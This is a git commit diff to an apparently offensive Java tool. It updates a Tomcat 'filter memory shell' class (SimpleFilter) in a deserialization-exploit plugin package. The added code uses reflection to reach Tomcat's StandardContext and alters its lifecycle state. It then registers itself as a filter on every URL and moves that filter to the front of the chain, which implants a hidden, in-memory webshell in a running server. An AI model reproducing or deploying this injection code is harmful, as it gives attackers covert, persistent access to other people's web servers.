01eaf2d8affe90ebdd28ec8f36106d6795ad908a
woxihuannisja <1483943306@qq.com>
2021-02-20 17:51:44 +0800

    修复filter内存马

--- src/main/java/vulgui/deser/plugins/filter/SimpleFilter.java
+++ src/main/java/vulgui/deser/plugins/filter/SimpleFilter.java
@@ -15,11 +15,9 @@ import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
-import javax.servlet.jsp.JspFactory;
 import org.apache.catalina.Context;
 import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.Response;
-import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
@@ -33,7 +31,7 @@ public class SimpleFilter implements Filter {
   public static Logger log = Logger.getLogger(x.SimpleFilter.class.toString());
 
   public static final String FILTE_NAME = "SimpleFilter";
-  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
+
   private String pwd;
   private String path;
 
@@ -97,17 +95,45 @@ public class SimpleFilter implements Filter {
   }
 
   public void dynamicAddFilter(ServletContext servletContext) {
-
+    System.out.println("dynamic add filter");
     StandardContext standardContext = null;
     try {
       Field field = servletContext.getClass().getDeclaredField("context");
       field.setAccessible(true);
-      ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
-      field = applicationContext.getClass().getDeclaredField("context");
-      field.setAccessible(true);
-      standardContext = (StandardContext) field.get(applicationContext);
+      // Object o=field.get(servletContext);
+      // if (o instanceof javax.servlet.ServletContext) {
+      //   System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
+      // } else if (o instanceof org.apache.catalina.core.StandardContext) {
+      //   System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
+      // }else{
+      //   System.out.println("servlet的context对象未知");
+      // }
 
-      field = standardContext.getClass().getDeclaredField("filterConfigs");
+      for (; standardContext == null; ) {
+        java.lang.reflect.Field contextField = servletContext.getClass()
+            .getDeclaredField("context");
+        contextField.setAccessible(true);
+        Object o = contextField.get(servletContext);
+
+        if (o instanceof javax.servlet.ServletContext) {
+          servletContext = (javax.servlet.ServletContext) o;
+          System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
+        } else if (o instanceof org.apache.catalina.core.StandardContext) {
+          standardContext = (org.apache.catalina.core.StandardContext) o;
+          System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
+        }
+      }
+      // 获取servletContext的context成员 类型为ApplicationContext
+      // ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
+      // field = applicationContext.getClass().getDeclaredField("context");
+      // field.setAccessible(true);
+      // // 获取ApplicationContext applicationContext的context成员 类型为StandardContext
+      // standardContext = (StandardContext) field.get(applicationContext);
+      // standardContext.getClass()获取到的class:org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext
+      // field = standardContext.getClass().getDeclaredField("filterConfigs");
+      System.out
+          .println("standardContext.getClass()获取到的class:" + standardContext.getClass().getName());
+      field = StandardContext.class.getDeclaredField("filterConfigs");
       field.setAccessible(true);
       // 获取standardContext的filterConfigs 如下定义
       /**
@@ -153,5 +179,80 @@ public class SimpleFilter implements Filter {
     filterMap.setFilterName(FILTE_NAME);
     standardContext.addFilterMapBefore(filterMap);
     System.out.println("inject filter " + FILTE_NAME + " ok");
+  }
+
+
+  public void dynamicAddFilter2(ServletContext servletContext) {
+    System.out.println("add dynamic Add Filter2");
+    org.apache.catalina.core.StandardContext standardContext = null;
+    //判断是否已有该名字的filter，有则不再添加
+    try {
+      if (servletContext.getFilterRegistration(FILTE_NAME) == null) {
+        //遍历出标准上下文对象
+        for (; standardContext == null; ) {
+          Field contextField = servletContext.getClass()
+              .getDeclaredField("context");
+          contextField.setAccessible(true);
+          Object o = contextField.get(servletContext);
+          if (o instanceof ServletContext) {
+            servletContext = (ServletContext) o;
+          } else if (o instanceof StandardContext) {
+            standardContext = (StandardContext) o;
+          }
+        }
+        if (standardContext != null) {
+          //修改状态，要不然添加不了
+          Field stateField = org.apache.catalina.util.LifecycleBase.class
+              .getDeclaredField("state");
+          stateField.setAccessible(true);
+          stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+          //创建一个自定义的Filter马
+          // Filter threedr3am = new TomcatShellInject();
+          //添加filter马
+          javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
+              .addFilter(FILTE_NAME, this);
+          filterRegistration.setInitParameter("encoding", "utf-8");
+          filterRegistration.setAsyncSupported(false);
+          filterRegistration
+              .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),
+                  false,
+                  new String[]{"/*"});
+          //状态恢复，要不然服务不可用
+          if (stateField != null) {
+            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+          }
+
+          if (standardContext != null) {
+            //生效filter
+            java.lang.reflect.Method filterStartMethod = StandardContext.class
+                .getMethod("filterStart");
+            filterStartMethod.setAccessible(true);
+            filterStartMethod.invoke(standardContext, null);
+
+            //把filter插到第一位
+            FilterMap[] filterMaps = standardContext
+                .findFilterMaps();
+            for (int i = 0; i < filterMaps.length; i++) {
+              if (filterMaps[i].getFilterName().equalsIgnoreCase(FILTE_NAME)) {
+                FilterMap filterMap = filterMaps[i];
+                filterMaps[i] = filterMaps[0];
+                filterMaps[0] = filterMap;
+                break;
+              }
+            }
+          }
+        }
+
+
+      }
+    } catch (NoSuchFieldException e) {
+      e.printStackTrace();
+    } catch (IllegalAccessException e) {
+      e.printStackTrace();
+    } catch (NoSuchMethodException e) {
+      e.printStackTrace();
+    } catch (InvocationTargetException e) {
+      e.printStackTrace();
+    }
   }
 }
